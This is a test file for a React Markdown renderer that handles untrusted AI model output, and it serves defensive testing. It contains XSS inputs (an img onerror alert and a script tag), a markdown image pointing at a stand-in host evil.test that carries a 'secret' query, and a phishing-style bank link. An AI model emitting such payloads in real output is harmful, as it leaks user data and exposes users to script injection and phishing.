import { cleanup, render } from '@testing-library/react'
import { afterEach, describe, expect, it } from 'vitest'
import { Markdown } from '../../../src/renderer/assistant/components/Markdown'

afterEach(cleanup)

describe('Markdown (untrusted model output)', () => {
  it('renders formatting, lists and code', () => {
    const { container } = render(<Markdown text={'**Bold** and `code`\n\n1. one\n2. two'} />)
    expect(container.querySelector('strong')?.textContent).toBe('Bold')
    expect(container.querySelectorAll('ol li')).toHaveLength(2)
    expect(container.querySelector('code')?.textContent).toBe('code')
  })

  it('keeps numbering when a code block interrupts a list', () => {
    const { container } = render(
      <Markdown text={'1. Open the file\n2. Change it:\n\n```ts\nx = 1\n```\n\n3. Save'} />,
    )
    const lists = container.querySelectorAll('ol')
    expect(lists[1]?.getAttribute('start')).toBe('3')
  })

  it('drops raw HTML instead of rendering it', () => {
    const { container } = render(
      <Markdown text={'Hi <img src=x onerror="alert(1)"> <script>alert(2)</script><b>b</b>'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('b')).toBeNull()
  })

  it('never loads images, which could leak data through their URLs', () => {
    const { container } = render(<Markdown text={'![chart](https://evil.test/p.png?d=secret)'} />)
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('[image: chart]')
  })

  it('shows links with their real address but makes nothing clickable', () => {
    const { container } = render(<Markdown text={'[Your bank](https://evil.test/login)'} />)
    expect(container.querySelector('a')).toBeNull()
    expect(container.textContent).toContain('Your bank (https://evil.test/login)')
  })

  it('gives code blocks a copy button', () => {
    const { getByRole } = render(<Markdown text={'```sh\nrm -rf build\n```'} />)
    expect(getByRole('button', { name: 'Copy code' })).toBeTruthy()
  })
})
